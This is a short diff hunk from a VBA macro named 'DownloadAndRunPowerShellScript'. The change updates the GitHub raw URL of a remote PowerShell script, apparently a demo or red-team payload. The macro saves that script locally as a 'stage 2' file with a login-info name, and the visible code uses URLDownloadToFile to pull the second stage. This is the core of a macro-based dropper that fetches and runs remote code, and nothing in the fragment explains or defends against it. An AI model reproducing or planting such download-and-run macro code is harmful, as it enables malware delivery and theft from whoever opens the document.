@@ -14,7 +14,7 @@ Sub DownloadAndRunPowerShellScript()
     Dim LocalFilePath As String
     Dim DownloadStatus As LongPtr
     
-    URL = "https://raw.githubusercontent.com/JaBarosin/demos/master/newmini.ps1"
+    URL = "https://raw.githubusercontent.com/JaBarosin/demos/master/dev_info.ps1"
     LocalFilePath = "C:\temp\dev_login_info_stage_2.ps1"
     
     DownloadStatus = URLDownloadToFile(0, URL, LocalFilePath, 0, 0)
